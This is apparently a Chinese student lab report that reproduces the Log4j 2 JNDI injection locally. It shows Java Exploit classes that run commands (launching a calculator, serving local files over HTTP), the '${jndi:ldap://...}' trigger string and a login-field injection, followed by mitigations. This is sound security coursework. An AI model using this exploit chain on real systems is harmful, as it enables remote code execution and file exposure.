
## 1 实验过程 / 代码补充 / 攻击结果

### 1.1 本地触发 Log4j 2 漏洞，弹出计算器

#### 1.1.1 环境配置
下面是配置 marshalsec 的截图；其他都已经配过了：
![image.png](./assets/1651193668841-b4564a72-5915-4e3a-9f8a-31f2b29bd35b.png)

#### 1.1.2 编写 Exploit 类代码并编译
```java
import java.io.IOException;

public class Exploit {
	static {
		System.out.println("Run script!");
		System.out.println("Attack!");
        try {
            java.lang.Runtime.getRuntime().exec("calc").waitFor();
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```
![image.png](./assets/1651207377561-99d61dac-7be4-445f-83f4-817e0e23133c.png)

#### 1.1.3 启动 LDAP 服务和 Web 服务
![image.png](./assets/1651193700491-3d27f441-f2da-4622-99b1-d32eaab59ecd.png)
![image.png](./assets/1651193868686-d17118e8-174a-4b27-aa0d-e21ac10d531a.png)

#### 1.1.4 调用 Log4j 从而触发漏洞
编写如下调用代码：
```java
public class Log4j {
    private static final Logger LOGGER = LogManager.getLogger(Log4j.class);
    public static void main(String[] args) {
        LOGGER.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }
}
```
但是，出现了如下的错误提示：
![image.png](./assets/1651201785230-5337cd57-274c-452c-ac7b-88b9acfdea43.png)

Google 后找到了如下的 issue：<br />[https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce/issues/1](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce/issues/1)
issue 中主要提到两个方面的问题，分别是 JDK 版本问题和关于 `**trustURLCodebase**` 的问题。查询资料后得知：
> 在 JDK 8u121 及其之后版本中，系统属性 **com.sun.jndi.rmi.object.trustURLCodebase **默认值为 **false**，即默认不允许从远程的 Codebase 加载 Reference 工厂类

因此版本过高可能不能成功加载，因此我一方面在 `Log4j.main` 中增加了 `System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");`，另一方面也尝试了换用 1.7.0_80 和 1.8.0_202 两个版本分别编译 Log4j 和 Exploit，但是还是失败了。

和助教讨论后，助教指出可能是之前的 Web 服务没有正常运行。我尝试在浏览器中访问 127.0.0.1:8100，发现果然无法访问。我将 `python` 改为 `python3` 之后便可以正常访问了。
![image.png](./assets/1651206766906-b562084e-32e0-4f6a-b6a0-59850527628b.png)
（这里更改了端口号，在 LDAP 服务中也对应更改了。）


#### 1.1.5 成功！
终于成功了！通过该漏洞调用了计算器：
![image.png](./assets/1651206752460-66100f64-8e41-4853-b743-320b32b684e3.png)


### 1.2 在 Java Web 项目中触发漏洞

#### 1.2.1 环境配置
启动 Redis 服务，端口号是 6379：
![image.png](./assets/1651236155472-affd1da1-b4ce-40a8-8f60-c3e323c04b66.png)
运行 MySQL 并运行所给脚本，更新 application.properties（略）


#### 1.2.2 编写 Exploit 类代码并编译
在路径 F:\GitFiles\CourseData\3_2\SysSec\Lab1\syssec22\src\lab1 中编写代码并编译：
```java
import java.io.IOException;

public class Exploit {
    static {
		System.out.println("Run script!");
		System.out.println("Attack!");
        try {
            java.lang.Runtime.getRuntime().exec("python3 -m http.server 8866").waitFor();
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```
![image.png](./assets/1651236540846-b30e759b-5d59-4b18-ae16-e90fa6e5c492.png)
即，当 Exploit 类被访问时，会在路径 host 一个 web 服务，端口号是 8866。

#### 1.2.3 启动 LDAP 服务和 Web 服务
在 Exploit 代码所在路径启动一个 web 服务，端口号为 8888：
![image.png](./assets/1651236618299-2c7faefc-619f-4945-b293-3bdcd4998fa4.png)
启动一个 LDAP 服务：
![image.png](./assets/1651236581170-30c3921a-2e8f-4e4c-b413-349e021bae22.png)

#### 1.2.4 攻击！
在登录界面键入如下的用户名：
![image.png](./assets/1651236078182-32f38a19-25fb-4056-96fd-a54e212b5e91.png)
可以看到，LDAP 出现了相应的查询信息：
![image.png](./assets/1651236096823-e5d3dfa4-38bf-4eb6-98b9-bba820988281.png)
![image.png](./assets/1651236055919-47f385dd-af2a-4b99-84b9-88aac0fdd209.png)

#### 1.2.5 成功！
尝试在浏览器访问 `127.0.0.1:8866`，可以看到我们已经可以访问本地文件：
![image.png](./assets/1651236063764-fbf383c5-82dd-4d04-8e63-34de49427aef.png)
![image.png](./assets/1651236453017-70157615-45d5-4c40-a9d4-d31871cbce51.png)

## 2 如何防护 Apache Log4j2 漏洞

1. 首先，最方便的方法是，更新 Log4j 到解决了这一漏洞的版本。
2. 从 1.1.4 中我们解决问题的过程中也可以知道，提高 JDK 版本可以解决这一问题，因为
> 在 JDK 8u121 及其之后版本中，系统属性 **com.sun.jndi.rmi.object.trustURLCodebase **默认值为 **false**，即默认不允许从远程的 Codebase 加载 Reference 工厂类

3. 当然，我们也可以通过 `System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","false");` 来显式实现这一禁用；
4. 我们也可以在查询中进行 filter 或者 escape，禁止包含一些 pattern 的查询，或者对查询做一些转义；当然，这里前者很容易被绕过，而后者可能需要对 LDAP 等服务也做修改；
5. 我们也可以禁用 Log4j 中的 lookup 功能。从 1.1.4 中提到的 issue 中得知，我们可以通过添加 JVM 启动参数`-Dlog4j2.formatMsgNoLookups=true`或者添加`log4j2.component.properties` 配置文件并添加配置`log4j2.formatMsgNoLookups=true`来实现。
